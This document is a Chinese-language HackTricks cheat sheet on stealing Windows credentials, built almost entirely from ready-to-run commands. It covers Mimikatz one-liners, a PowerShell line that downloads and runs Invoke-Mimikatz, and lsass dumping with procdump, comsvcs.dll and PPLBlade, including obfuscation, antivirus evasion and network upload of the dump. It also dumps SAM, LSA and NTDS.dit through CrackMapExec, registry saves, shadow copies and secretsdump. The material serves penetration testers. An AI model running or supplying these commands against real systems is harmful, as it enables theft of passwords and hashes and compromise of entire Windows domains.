# 窃取Windows凭证

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 凭证 Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**在** [**这个页面**](credentials-mimikatz.md)**中查找Mimikatz可以执行的其他操作。**

### 调用Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**了解一些可能的凭据保护措施。**](credentials-protections.md) **这些保护措施可以防止 Mimikatz 提取一些凭据。**

## 使用 Meterpreter 提取凭据

使用我创建的[**凭据插件**](https://github.com/carlospolop/MSF-Credentials) **来搜索受害者内部的密码和哈希值。**
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## 绕过杀毒软件

### Procdump + Mimikatz

由于**SysInternals**的**Procdump**是一个合法的微软工具，因此不会被Defender检测到。\
您可以使用这个工具来**转储lsass进程**，**下载转储文件**，并从中**本地提取**凭据。

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="从转储中提取凭据" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

这个过程是通过[SprayKatz](https://github.com/aas-n/spraykatz)自动完成的：`./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注意**: 一些**杀毒软件**可能会将使用**procdump.exe转储lsass.exe**视为**恶意行为**，这是因为它们检测到了字符串**"procdump.exe"和"lsass.exe"**。因此，更隐蔽的方法是将lsass.exe的**PID**作为参数传递给procdump，而不是使用lsass.exe的名称。

### 使用**comsvcs.dll**转储lsass

位于`C:\Windows\System32`中的名为**comsvcs.dll**的DLL负责在发生崩溃时**转储进程内存**。该DLL包含一个名为**`MiniDumpW`**的函数，设计用于使用`rundll32.exe`调用。\
使用前两个参数是无关紧要的，但第三个参数分为三个组件。要转储的进程ID构成第一个组件，转储文件位置代表第二个组件，第三个组件严格为单词**full**。没有其他可选项。\
解析这三个组件后，DLL将开始创建转储文件，并将指定进程的内存传输到此文件中。\
可以利用**comsvcs.dll**来转储lsass进程，从而消除上传和执行procdump的需要。此方法在[https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords)中有详细描述。

以下命令用于执行：
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**您可以使用** [**lssasy**](https://github.com/Hackndo/lsassy)** 来自动化这个过程。**

### **使用任务管理器转储 lsass**

1. 在任务栏上右键单击，然后单击任务管理器
2. 单击“详细信息”
3. 在“进程”选项卡中搜索“本地安全机构进程”进程
4. 右键单击“本地安全机构进程”进程，然后单击“创建转储文件”。

### 使用 procdump 转储 lsass

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) 是微软签名的二进制文件，是 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 套件的一部分。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## 使用PPLBlade转储lsass

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade)是一种受保护的进程转储工具，支持对内存转储进行混淆，并将其传输到远程工作站，而无需将其放在磁盘上。

**关键功能**：

1. 绕过PPL保护
2. 对内存转储文件进行混淆，以规避Defender基于签名的检测机制
3. 使用RAW和SMB上传方法上传内存转储，而无需将其放在磁盘上（无文件转储）

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## CrackMapExec

### 转储 SAM 哈希
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### 转储 LSA 机密
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### 从目标 DC 转储 NTDS.dit
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### 从目标 DC 中转储 NTDS.dit 密码历史
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 显示每个NTDS.dit帐户的pwdLastSet属性
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## 窃取SAM & SYSTEM

这些文件应该位于 _C:\windows\system32\config\SAM_ 和 _C:\windows\system32\config\SYSTEM._ 但是**你不能简单地复制它们**因为它们受到保护。

### 从注册表中

窃取这些文件的最简单方法是从注册表中获取副本：
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**下载**这些文件到您的Kali机器，并使用以下命令**提取哈希值**：
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### 卷影复制

您可以使用此服务执行受保护文件的复制。您需要是管理员。

#### 使用vssadmin

vssadmin二进制文件仅在Windows Server版本中可用。
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
但是你也可以通过**Powershell**做同样的事情。这是一个**如何复制SAM文件**的示例（硬盘使用的是"C:"，并保存在C:\users\Public），但你可以用它来复制任何受保护的文件：
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
代码来自书籍：[https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

最后，您还可以使用[**PS脚本Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)来复制SAM、SYSTEM和ntds.dit。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory凭证 - NTDS.dit**

**Ntds.dit文件是存储Active Directory数据的数据库**，包括有关用户对象、组和组成员的信息。它包含域中所有用户的密码哈希值。

重要的NTDS.dit文件将位于：_%SystemRoom%/NTDS/ntds.dit_\
此文件是一个由3个表“官方”组成的数据库_可扩展存储引擎_（ESE）：

* **数据表**：包含有关对象（用户、组等）的信息
* **链接表**：关系信息（成员等）
* **SD表**：包含每个对象的安全描述符

有关更多信息，请参阅：[http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows使用_Ntdsa.dll_与该文件进行交互，并由_lsass.exe_使用。然后，**NTDS.dit**文件的**部分**可能位于`lsass`内存中（您可以找到最近访问的数据，可能是因为使用**缓存**来提高性能）。

#### 解密NTDS.dit中的哈希值

哈希值被加密了3次：

1. 使用**BOOTKEY**和**RC4**解密密码加密密钥（**PEK**）。
2. 使用**PEK**和**RC4**解密**哈希**。
3. 使用**DES**解密**哈希**。

**PEK**在**每个域控制器**中具有**相同的值**，但它在**NTDS.dit**文件中使用**域控制器的SYSTEM文件的BOOTKEY（在域控制器之间不同）**进行加密。这就是为什么要从NTDS.dit文件中获取凭证**您需要NTDS.dit和SYSTEM文件**（_C:\Windows\System32\config\SYSTEM_）。

### 使用Ntdsutil复制NTDS.dit

自Windows Server 2008起可用。
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
你也可以使用**卷影复制**技巧来复制**ntds.dit**文件。请记住，你还需要一个**SYSTEM文件**的副本（同样，可以从注册表中转储或使用卷影复制技巧）。

### **从NTDS.dit中提取哈希值**

一旦你获得了**NTDS.dit**和**SYSTEM**文件，你可以使用像_secretsdump.py_这样的工具来**提取哈希值**：
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
您还可以使用有效的域管理员用户**自动提取它们**：
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
对于**大型NTDS.dit文件**，建议使用[gosecretsdump](https://github.com/c-sto/gosecretsdump)来提取它。

最后，您还可以使用**metasploit模块**：_post/windows/gather/credentials/domain\_hashdump_或**mimikatz** `lsadump::lsa /inject`

### **将NTDS.dit中的域对象提取到SQLite数据库**

NTDS对象可以使用[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)提取到SQLite数据库中。不仅提取了秘密，还提取了整个对象及其属性，以便在已经检索到原始NTDS.dit文件时进行进一步信息提取。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` 注册表文件是可选的，但允许进行秘密解密（NT 和 LM 哈希值，附加凭据，如明文密码，Kerberos 或信任密钥，NT 和 LM 密码历史记录）。除其他信息外，还提取以下数据：用户和计算机帐户及其哈希值，UAC 标志，最后登录和更改密码的时间戳，帐户描述，名称，UPN，SPN，组和递归成员，组织单位树和成员，受信任的域及其信任类型，方向和属性...

## Lazagne

从[这里](https://github.com/AlessandroZ/LaZagne/releases)下载二进制文件。您可以使用此二进制文件从多个软件中提取凭据。
```
lazagne.exe all
```
## 从SAM和LSASS中提取凭据的其他工具

### Windows凭据编辑器（WCE）

该工具可用于从内存中提取凭据。从以下链接下载：[http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

从SAM文件中提取凭据
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

从 SAM 文件中提取凭据
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

从[http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7)下载并**执行**它，密码将被提取。

## 防御

[**在这里了解一些凭据保护措施。**](credentials-protections.md)

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
